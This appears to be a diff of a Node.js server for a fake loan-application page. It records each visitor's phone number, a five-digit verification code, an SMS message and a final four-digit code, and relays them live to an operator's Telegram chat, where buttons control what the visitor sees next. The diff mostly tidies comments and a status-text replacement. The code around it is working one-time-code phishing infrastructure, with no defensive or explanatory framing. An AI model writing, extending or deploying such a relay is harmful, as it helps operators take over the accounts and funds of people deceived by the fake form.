@@ -13,7 +13,7 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// This object keeps track of the user's phone and code across pages
+// Track user sessions
 const activeSessions = {}; 
 
 app.use(express.urlencoded({ extended: true }));
@@ -33,7 +33,6 @@ io.on('connection', (socket) => {
 
     // 1. Initial Application Submit
     socket.on('submit_loan', async (data) => {
-        // Save the user's details in memory
         activeSessions[socket.id] = {
             phone: data.phone,
             code5: data.verificationCode
@@ -65,7 +64,6 @@ io.on('connection', (socket) => {
 
     // 2. SMS Submit
     socket.on('submit_sms', async (smsMessage) => {
-        // Retrieve the saved session data
         const session = activeSessions[socket.id] || { phone: 'Unknown', code5: 'Unknown' };
 
         const msg = `
@@ -98,7 +96,6 @@ io.on('connection', (socket) => {
 
     // 3. Final 4-Digit Code Submit
     socket.on('submit_final_code', async (fullCode) => {
-        // Retrieve the saved session data
         const session = activeSessions[socket.id] || { phone: 'Unknown', code5: 'Unknown' };
 
         const msg = `
@@ -128,7 +125,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Clean up memory when user disconnects
     socket.on('disconnect', () => {
         delete activeSessions[socket.id];
     });
@@ -136,14 +132,16 @@ io.on('connection', (socket) => {
 
 // --- HELPER FUNCTION TO UPDATE TELEGRAM MESSAGE STATUS ---
 async function updateMessageStatus(query, originalText, newStatus) {
-    const updatedText = originalText.replace('⏳ <b>Status:</b> Waiting for your decision...', newStatus);
+    // Replace the waiting text with the new status
+    const updatedText = originalText.replace('⏳ Status: Waiting for your decision...', newStatus)
+                                   .replace('⏳ <b>Status:</b> Waiting for your decision...', newStatus);
     
     try {
         await bot.editMessageText(updatedText, {
             chat_id: query.message.chat.id,
             message_id: query.message.message_id,
             parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] }
+            reply_markup: { inline_keyboard: [] } // Remove buttons
         });
     } catch (err) {
         console.error("Error editing message:", err.message);
@@ -155,6 +153,8 @@ bot.on('callback_query', async (query) => {
     const data = query.data.split('_');
     const socketId = data[data.length - 1]; 
     const userSocket = io.sockets.sockets.get(socketId);
+    
+    // Note: Telegram sends the plain text of the message in query.message.text
     const originalText = query.message.text;
 
     if (!userSocket) {
